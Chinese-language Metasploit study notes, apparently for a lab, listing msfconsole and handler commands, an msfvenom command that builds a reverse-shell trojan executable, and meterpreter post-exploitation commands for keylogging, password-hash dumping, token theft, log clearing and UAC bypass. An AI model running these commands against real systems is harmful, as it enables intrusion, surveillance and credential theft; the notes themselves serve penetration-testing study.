# metasploit-framework

## 介绍 exp: 漏洞利用脚本+payload(漏洞利用用到的命令)

poc: 漏洞验证脚本 kali+windows

## 基本使用

msf分为两部分: msfconsole(控制台), msfvenom(木马生成平台)

数据库: postgresql

数据库开机自启: systemctl enable postgresql

刚打开: msfdb init

metasploit v6.0.52-dev ]

+ – --=[ 2147 exploits - 1143 auxiliary - 365 post ]

+ – --=[ 596 payloads - 45 encoders - 10 nops ]

+ – --=[ 8 evasion]

exploits: 攻击脚本（exp：利用漏洞攻击，poc：验证漏洞）

payloads: 攻击载荷（攻击过程中执行的代码）

auxiliary: 辅助脚本（没有payload的exp，用于漏洞利用）

poc post: 后渗透脚本（文件上传）

encoders: 编码器

二进制安全：学的要深

**web安全：**学的要广，木马免杀

nops: 空指令（混淆代码）

eavsion: 免杀模块 实效性

### 指令

banner 看msf指纹

help + 指令 查看帮助信息

核心指令: exit 退出控制台

history 显示历史记录

load 加载插件

quit 退出控制台

route 看路由表

sessions 看会话信息(连上的靶机会话)

-i 进入会话

-u 会话提升到meterpreter

set 设置参数

setg 设置全局参数

模块指令:

advanced 显示模块的高级参数

back 返回上一级

clearm 清除堆栈中的模块

info 显示模块信息

listm 列出堆栈中的模块信息

options 显示参数信息

popm 把模块弹出堆栈

pushm 把模块压入堆栈

search 搜索模块信息

show 显示模块信息

use 使用模块

任务指令:

handler 快速生成监听

jobs 查看当前后台中的任务信息

-k id 杀死指定任务

-K 清除所有任务

kill 杀死任务

凭据相关:

creds 列出数据库中保存的账号密码

执行模块:

check 检测目标是否有漏洞

exploit 执行脚本

run 执行脚本

background 返回控制台

数据库相关:

msfdb init 初始化数据库

msfdb start 开启数据库

db_disconnect 断开数据库

db_connect 连接数据库

==1. 配置文件 db_connect -y /usr/share/metasploit-framework/config/database.yml==

==2. 用账号密码连接 db_connect msf:NS0PBOyfTvJas+bx/GF0fmUiVEK8M+wTQKPEVOttF3o=@127.0.0.1/msf ==

### 基操

exploit/multi/handler 监听模块 `命令可以用tab键补全

开监听器:

use exploit/multi/handler

set payload windows/shell/reverse_tcp

meterpreter/shell

show options

set LHOST 192.168.1.128

run

后台监听: run -j -z

持久化监听: handler -H 192.168.1.128 -P 4445 -p windows/meterpreter/reverse_tcp

-H ip

-P port

-p payload

-x 监听到shell就关闭监听

Meterpreter session ==> meterpreter

Command session ==> cmd

#### 常用payload

`x64向下兼容能够运行x86程序, x86不能运行x64程序`

windows/x64/meterpreter/reverse_tcp

windows/x64/meterpreter/reverse_tcp_rc4

windows/x64/meterpreter/bind_tcp

windows/x64/meterpreter/bind_tcp_rc4

windows/x64/meterpreter/reverse_https

windows/x64/meterpreter/reverse_http

windows/meterpreter/reverse_tcp

shell: 反弹回来的是cmd

meterpreter: 反弹回来的是msf接收到的特定的cmd, 功能比cmd多非常多, 集成了非常多的接口

### msfvenom

-p payload 要跟控制台用的payload基本上对应

–list-options 列出参数信息

-e encode 编码格式

-l list 列出模块相关信息

-f format 格式

raw 原生的代码格式, 没有经过任何加工

-a arch|platform 指定平台

-o output 输出

-i iterations 编码次数

-x template 指定模板

生成木马 msfvenom

-p windows/meterpreter/reverse_tcp lhost=192.168.1.128 lport=4444 -f exe -o shell.exe

#### 木马下方的几种方式

开放服务器 servcie apache2 start /var/www/html 删除: index.html python: python2: python2 -m SimpleHTTPsever 80 python3: python3 -m http.server 80 ## 基本指令 windows中的权限: \`trustedintaller\` --> \`system\` --> \`administrator\` --> \`user\` bg 返回控制台 migrate 进程迁移, 保证木马连接的稳定性：migrate 想要迁移的进程pid 和ps连用 shell 进入shell sysinfo 获取操作系统基本信息 ps 列出进程 getpid 看进程id getuid 看当前用户 getsid 获取用户sid getsystem 提权到system, 前提是有管理员权限 run 运行后渗透脚本 load 加载插件 download 下载文件 upload 上传文件 show_mount 看磁盘 arp 看arp缓存 getproxy 列出代理配置 ifconfig Display interfaces ipconfig Display interfaces netstat Display the network connections portfwd 端口转发 resolve 域名解析 route 看路由表 clearev 痕迹清除 execute 执行指令 -H 隐藏进程窗口 -f 要执行的命令 -i 进入到交互模式 localtime 看本地时间 steal_token 身份盗用 rev2self 返回身份 reg 注册表(需要特权) keyscan_start 开启键盘记录 keyscan_dump 下载键盘记录 keyscan_stop 关闭键盘记录 screenshare 共享靶机屏幕 screenshot 截屏 hashdump 下载账号密码(hash) ## 提权 提权的前提: 是有目标的控制权 UAC: user account control 用户账户控制 1. 利用uac提权 exploit/windows/local/ask 绕过uac提权(bypassuac) 总共13个bypassuac脚本, search bypassuac exploit/windows/local/bypassuac_eventvwr exploit/windows/local/bypassuac exploit/windows/local/bypassuac_vbs 2. 内核提权(本地提权) 危害非常搭大 内核提权漏洞: 要关注相关的影响范围 作用: 直接拿到系统权限, 但是可能会造成系统死机,蓝屏,崩溃 cve-2018-8120 漏洞探测: 看补丁信息 vulmap 找exp: https://github.com/SecWiki/windows-kernel-exploits https://github.com/qazbnm456/awesome-cve-poc#cve-2011-2856 https://github.com/SecWiki/linux-kernel-exploits ```
